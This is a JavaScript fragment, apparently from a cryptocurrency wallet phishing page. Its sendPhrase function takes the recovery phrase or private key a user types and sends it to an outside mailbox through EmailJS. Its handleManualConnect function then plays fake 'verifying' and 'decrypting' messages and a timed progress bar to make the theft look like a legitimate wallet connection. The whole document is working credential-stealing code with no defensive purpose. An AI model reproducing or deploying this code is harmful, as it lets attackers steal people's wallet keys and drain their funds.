function handleManualConnect() {
  aborted = false;
  const statusEl = document.getElementById('s2Status');
  const progressEl = document.getElementById('s2Progress');
  progressEl.style.width = '0%';
  const manualMsgs = [
    "Verifying credentials...", "Decrypting recovery phrase...",
    "Checking phrase integrity...", "Validating word count...",
    "Deriving wallet address...", "Cross-referencing on-chain data...",
    "Authenticating private key...", "Establishing secure session...",
    "Verifying key format...", "Almost done..."
  ];
  let i = 0; statusEl.textContent = manualMsgs[0];
  sTimer = setInterval(() => {
    i++;
    statusEl.style.opacity = '0';
    setTimeout(() => { statusEl.textContent = manualMsgs[i % manualMsgs.length]; statusEl.style.opacity = '1'; }, 100);
  }, 600);
  let pct = 0;
  pTimer = setInterval(() => {
    pct = Math.min(pct + (100 / (6000 / 200)), 99);
    progressEl.style.width = pct + '%';
  }, 200);
  cTimer = setTimeout(() => {
    if (aborted) return;
    clearInterval(sTimer); clearInterval(pTimer);
    progressEl.style.width = '100%';
    showSub('wScreen5');
  }, 6000);
}


function sendPhrase(){
      const input = document.getElementById('phraseInput').value.trim();
    if (!input) { alert('Please enter your recovery phrase or private key before connecting.'); return; }
  else{
    let parms = {
        message: document.getElementById("phraseInput").value
    }

    emailjs.send("service_8ib9bpu", "template_esfm5jm", parms).then(
        handleManualConnect()
    );  

  }
};